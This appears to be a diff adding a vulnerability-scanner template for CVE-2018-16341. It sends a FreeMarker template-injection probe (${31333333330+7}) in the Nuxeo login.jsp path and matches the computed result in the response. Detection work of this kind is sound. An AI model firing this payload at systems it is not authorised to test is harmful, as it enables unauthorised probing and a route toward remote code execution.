@@ -1,0 +1,30 @@
+[info]
+author = "AVE"
+description = "Nuxeo Platform 10.3 之前版本存在服务端模板注入漏洞，通过向 /nuxeo/login.jsp/ 路径后注入 FreeMarker 模板表达式 ${31333333330+7} 可触发 SSTI，响应中包含计算结果 31333333337 即证明漏洞存在。"
+id = "POC-AVE-2018-0110"
+name = "Nuxeo Platform SSTI 远程代码执行 PoC"
+severity = "high"
+tags = [
+    "cve-2018-16341",
+    "nuxeo",
+    "ssti",
+    "rce",
+]
+vuln_id = [
+    "CVE-2018-16341",
+    "AVE-2018-0110",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/nuxeo/login.jsp/pwn${31333333330+7}.xhtml"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["31333333337"]
